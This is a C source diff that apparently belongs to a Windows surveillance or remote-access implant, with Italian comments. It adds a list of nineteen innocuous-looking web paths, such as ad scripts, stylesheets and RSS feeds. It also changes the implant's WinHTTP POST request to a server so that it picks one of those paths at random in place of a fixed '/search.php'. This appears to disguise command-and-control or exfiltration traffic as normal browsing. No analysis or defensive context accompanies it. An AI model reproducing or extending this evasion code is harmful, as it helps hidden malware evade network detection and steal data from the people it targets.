@@ -72,6 +72,29 @@ typedef struct {
 	DWORD out_param_len;
 } ASP_IPCCommandDataStruct;
 
+#define REQUEST_ARRAY_LEN 19
+WCHAR *wRequest_array[] = {
+		L"/pagead/show_ads.js",
+		L"/licenses/by-nc-nd/2.5",
+		L"/css-validator",
+		L"/stats.asp?site=actual",
+		L"/static/js/common/jquery.js",
+		L"/cgi-bin/m?ci=ads&amp;cg=0",
+		L"/rss/homepage.xml",
+		L"/index.shtml?refresh",
+		L"/static/css/common.css",
+		L"/flash/swflash.cab#version=8,0,0,0",
+		L"/js/swfobjectLivePlayer.js?v=10-57-13",
+		L"/css/library/global.css",
+		L"/rss/news.rss",
+		L"/comments/new.js",
+		L"/feed/view?id=1&type=channel",
+		L"/ajax/MessageComposerEndpoint.php?__a=1",
+		L"/safebrowsing/downloads?client=navclient",
+		L"/extern_js/f/TgJFbiseMTg4LCsw2jgAQIACWFACU6rCA7RidA/qFso89FTd1c.js",
+		L"/search.php"
+	};
+
 HANDLE ASP_HostProcess = NULL; // Processo che gestisce ASP
 ASP_IPCCommandDataStruct *ASP_IPC_command = NULL;  // Area di shared memory per dare comandi al processo ASP
 HANDLE hASPIPCcommandfile = NULL;                  // File handle della shared memory dei comandi
@@ -689,7 +712,7 @@ BOOL H_ASP_WinHTTPSetup(char *server_url, char *addr_to_connect, DWORD buflen, D
 		return FALSE;
 	
 	// Crea la richiesta
-	if ( !(asp_global_request = FNC(WinHttpOpenRequest)( hConnect, L"POST", L"/search.php", NULL, WINHTTP_NO_REFERER, (LPCWSTR *) types, 0)) )
+	if ( !(asp_global_request = FNC(WinHttpOpenRequest)( hConnect, L"POST", wRequest_array[rand()%REQUEST_ARRAY_LEN], NULL, WINHTTP_NO_REFERER, (LPCWSTR *) types, 0)) )
 		return FALSE;
 
 	FNC(WinHttpSetTimeouts)(asp_global_request, ASP_RESOLVE_TIMEOUT, ASP_CONNECT_TIMEOUT, ASP_SEND_TIMEOUT, ASP_RECV_TIMEOUT);
